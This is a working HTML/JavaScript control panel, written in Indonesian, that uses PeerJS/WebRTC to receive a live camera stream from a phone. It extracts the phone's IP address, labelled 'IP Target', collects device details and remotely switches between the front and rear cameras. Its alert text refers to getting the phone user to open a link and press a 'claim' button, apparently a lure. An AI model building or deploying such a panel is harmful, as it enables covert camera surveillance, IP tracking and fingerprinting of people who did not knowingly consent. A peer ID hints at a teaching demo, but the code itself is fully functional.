<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Panel Kontrol Kamera (Laptop)</title>
  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
  <style>
    body { font-family: sans-serif; text-align: center; background: #222; color: white; padding: 20px; }
    video { width: 80%; max-width: 600px; border-radius: 10px; border: 2px solid #00ffcc; margin-top: 15px; }
    button { padding: 12px 24px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
    button:hover { background: #0056b3; }
    #infoBox { background: #333; margin: 15px auto; padding: 15px; border-radius: 8px; max-width: 600px; color: #00ffcc; font-family: monospace; text-align: left; line-height: 1.6; word-break: break-all; }
  </style>
</head>
<body>
  <h2>Layar Pantau Kamera HP (Live)</h2>
  <button id="switchBtn">🔄 Ganti Kamera (Depan / Belakang)</button> <br>
  
  <!-- Kotak Informasi IP & Spesifikasi HP -->
  <div id="infoBox">Status: Menunggu koneksi dari HP...</div>

  <video id="remoteVideo" autoplay playsinline muted></video>

  <script>
    const ID_LAPTOP = "guru-demo-kamera-123";

    const peer = new Peer(ID_LAPTOP, {
      config: {
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' },
          { urls: 'stun:stun2.l.google.com:19302' }
        ]
      }
    });

    let activeDataConn = null;
    let ipTargetInfo = "Mencari IP...";
    let deviceInfoText = "Menunggu data perangkat...";

    function updateDisplay() {
      const infoBox = document.getElementById('infoBox');
      infoBox.innerHTML = `
        <strong>🌐 KONEKSI JARINGAN:</strong><br>
        ${ipTargetInfo}<br><br>
        <strong>📱 SPESIFIKASI PERANGKAT HP:</strong><br>
        ${deviceInfoText}
      `;
    }

    // 1. Menangkap siaran video dari HP & mendeteksi Alamat IP
    peer.on('call', (call) => {
      call.answer();
      call.on('stream', (remoteStream) => {
        document.getElementById('remoteVideo').srcObject = remoteStream;
        
        setTimeout(() => {
          call.peerConnection.getStats().then(stats => {
            stats.forEach(report => {
              if (report.type === 'remote-candidate' && report.ip) {
                ipTargetInfo = `• IP Target: <strong>${report.ip}</strong><br>• Port: ${report.port}<br>• Tipe Jalur: ${report.candidateType}`;
                updateDisplay();
              }
            });
          });
        }, 1000);
      });
    });

    // 2. Menangkap data profil spesifikasi HP
    peer.on('connection', (conn) => {
      activeDataConn = conn;

      conn.on('data', (data) => {
        if (data.type === 'device-info') {
          deviceInfoText = `
            • OS & Peramban: ${data.osBrowser}<br>
            • Resolusi Layar: ${data.resolusi}<br>
            • Inti CPU: ${data.cpuCore} Core | Estimasi RAM: ${data.ram}<br>
            • Zona Waktu: ${data.zonaWaktu}
          `;
          updateDisplay();
        }
      });
    });

    // 3. Perintah tombol ganti kamera
    document.getElementById('switchBtn').addEventListener('click', () => {
      if (activeDataConn && activeDataConn.open) {
        activeDataConn.send('switch');
      } else {
        alert("HP belum terhubung! Buka link di HP dan tekan tombol klaim terlebih dahulu.");
      }
    });
  </script>
</body>
</html>
